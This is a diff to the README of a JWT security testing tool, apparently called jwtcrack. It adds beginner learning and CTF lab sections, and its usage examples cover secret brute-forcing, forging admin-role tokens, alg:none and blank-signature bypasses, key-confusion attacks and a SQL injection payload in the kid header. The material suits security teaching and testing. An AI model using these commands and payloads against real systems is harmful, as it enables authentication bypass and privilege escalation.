@@ -9,8 +9,9 @@ zero external dependencies beyond `rich` for terminal formatting. built using st
 ## features
 
 - **interactive web dashboard**: launch a local cyberpunk-styled dark mode gui in your browser (`jwtcrack gui`)
+- **beginner educational mode**: visual token breakdown, plain-language explanations of claims & signatures, and built-in practice CTF labs (`jwtcrack learn`, `jwtcrack lab`)
 - **decode**: parse and inspect token header, payload, and signature without needing the signing key
-- **analyze**: audit token security posture (`alg:none` bypasses, weak symmetric hmac, expired timestamps, missing standard claims)
+- **analyze & remediate**: audit token security posture and provide exact developer fix snippets (algorithms, claims, signatures)
 - **crack**: multi-threaded wordlist attack against hs256, hs384, and hs512 tokens with live throughput stats
 - **forge**: generate new tokens or alter existing claims (e.g. modify role or extend expiration) once the secret is known or with `alg:none`
 - **asp.net core support**: audit and normalize Microsoft XML schema claims (`schemas.microsoft.com/ws/2008/06/identity/claims/role`), detect claim confusion vulnerabilities, and forge ASP.NET Core compatible tokens (`--aspnet`)
@@ -37,34 +38,49 @@ python -m jwtcrack gui
 ```bash
 jwtcrack gui
 ```
-opens an interactive dark-mode dashboard at `http://127.0.0.1:8765` in your default browser. Paste any token to view decoded claims, audit security warnings, crack the secret in real-time, and forge elevated admin tokens with one click.
+opens an interactive dark-mode dashboard at `http://127.0.0.1:8765` with built-in Beginner Practice Labs, token decoder, vulnerability auditor, secret cracker, and token forger.
 
-### 1. decode a token
+### 1. beginner learn mode (token anatomy)
+```bash
+# visually break down token parts with plain-language explanation of claims
+jwtcrack learn [token]
+```
+
+### 2. beginner practice labs (ctf)
+```bash
+# list all built-in challenges
+jwtcrack lab
+
+# start a specific challenge (e.g. lab 1)
+jwtcrack lab 1
+```
+
+### 3. decode a token
 ```bash
 jwtcrack decode <token>
 ```
 
-### 2. analyze for vulnerabilities
+### 4. analyze for vulnerabilities & view remediations
 ```bash
 jwtcrack analyze <token>
 ```
 
-### 3. brute-force weak secrets
+### 5. brute-force weak secrets
 ```bash
 jwtcrack crack <token> --wordlist wordlists/common.txt --threads 8
 ```
 
-### 4. forge modified claims
+### 6. forge modified claims
 ```bash
 jwtcrack forge <token> --secret "password123" --claims '{"role":"admin"}' --extend-exp 24h
 ```
 
-### 5. generate a token from scratch
+### 7. generate a token from scratch
 ```bash
 jwtcrack generate --secret "mysecret" --claims '{"sub":"user123","role":"admin"}'
 ```
 
-### 6. asp.net core claim inspection & forging
+### 8. asp.net core claim inspection & forging
 ```bash
 # inspect and map asp.net xml schema claims
 jwtcrack aspnet <token>
@@ -73,7 +89,7 @@ jwtcrack aspnet <token>
 jwtcrack forge <token> --secret "mysecret" --claims '{"role":"Administrator"}' --aspnet
 ```
 
-### 7. exploit engine (cve & header bypasses)
+### 9. exploit engine (cve & header bypasses)
 ```bash
 # rs256 -> hs256 key confusion attack using public key
 jwtcrack exploit <token> --attack key-confusion --public-key pubkey.pem --claims '{"role":"admin"}'
@@ -88,7 +104,7 @@ jwtcrack exploit <token> --attack sqli --kid "key' UNION SELECT 'mysecret' -- -"
 jwtcrack exploit <token> --attack blank --claims '{"role":"admin"}'
 ```
 
-### 8. interactive mode
+### 10. interactive mode
 run without arguments to launch the interactive prompt:
 ```bash
 jwtcrack
